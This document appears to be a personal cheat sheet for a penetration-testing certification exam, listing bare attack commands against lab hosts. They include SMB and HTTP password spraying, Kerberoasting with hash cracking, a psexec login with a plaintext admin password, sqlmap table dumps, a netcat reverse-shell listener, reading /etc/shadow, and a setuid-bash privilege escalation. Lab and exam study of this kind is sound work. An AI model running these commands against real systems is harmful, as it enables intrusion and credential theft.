```
nmap -sn -PS22,135,139,445,3389 172.25.170.0/24 --exclude
172.25.170.1,172.25.170.250 -oG - | awk '/Up$/{print $2}'
```

```
crackmapexec smb 172.25.170.200 -u user -p Passwords.txt
```
https://proctor.examspecialists.com

```
Get-ADObject -Filter {objectClass -eq 'foreignSecurityPrincipal'}
-Server 172.25.170.20 | Select-Object Name | Format-List
```

```
crackmapexec smb 172.25.170.200 -u glee -p Passwords.txt
```

```
setspn -T CPTS.LOCALNET -Q */*
```

```
.\Rubeus.exe kerberoast /domain:CPTS.LOCALNET /user:john /nowrap
```


```
hashcat -m 13100 johnhash /home/sahil/Desktop/Passwords.txt --
force
```

```
powershell -c "Get-ADUser -Filter -Server 172.25.170.20 | Where-
Object {$_.SID -like '*1111'}"
```

```
powershell -c "(Get-ADComputer -Filter * -Server
172.25.170.20).Count"
```

```
powershell -c "Get-ADComputer SERVER2008 -Properties msDS-
SupportedEncryptionTypes -Server 172.25.170.20"
```

```
hydra -l administrator -P Passwords.txt 172.25.170.245 smb -t 16 -
f -V
```


```
impacket-psexec
'CPTSV2.LOCALNET/administrator:M@ils3cSrv2025'@172.25.170.245
```


## Binary

```
b main
```

```
r
```

```
p s
```

```
search -t string "/bin/sh"
```

```
print 0x7ffff7f4fea4 - 0x7ffff7dfd110
```

```
find / -name user-key.txt 2>/dev/null
```

```
sha256sum user-key.txt
```

## Lin Priv

```
sudo -l
sudo su -
cat /etc/shadow | grep root
```

```
john hash2 --wordlist=Passwords.txt
```

```
nmap -p22 -sC -sV 192.168.65.200 -vv
```

```
Linux Exploit Suggester
```

## firmware Firmware

```
binwalk firmware.bin --term
```

```
stat firmware.bin
```

```
binwalk firmware3.bin --term -e
```

```
ls | grep "813682"
```

```
file D8232C
```

```
find _firmware4.bin.extracted/ -type f \( -name "*.db" -o -name
"*.sqlite" \)
```

```
strings _firmware4.bin.extracted/squashfs-root/mnt/*.sqlite | grep -i -
C 5 "DSP-W215"
```

```
strings /bin/busybox | grep -i "BusyBox v" | head -n 1
```

```
strings 464A28 | grep -i "GCC" | head -n 1
```

```
grep -rnw "root" .
```

## Web App Pen

Robots.txt

```
gobuster dir -u http://10.10.1.72/ -w
/usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt,bak
```

```
rlwrap -f . -r nc -nvlp 4444
```

```
hydra -l jason -P Passwords.txt 10.10.1.137 -s 8080 http-post-form
"/login.php:username=^USER^&password=^PASS^:Invalid Password" -V -
f
```

```
sqlmap -r req --batch --dbs
```

```
sqlmap -r req --batch -D ticketing --tables
sqlmap -r req --batch -D ticketing -T agents --column
```

```
sqlmap -r req --batch -D ticketing -T agents --dump
```

```
ls -al /var/www/html/
```

```
echo "chmod +s /bin/bash" > youstc.sh
/bin/bash -p
find / -name final-root.txt 2>/dev/null
cat /root/final-root.txt
```

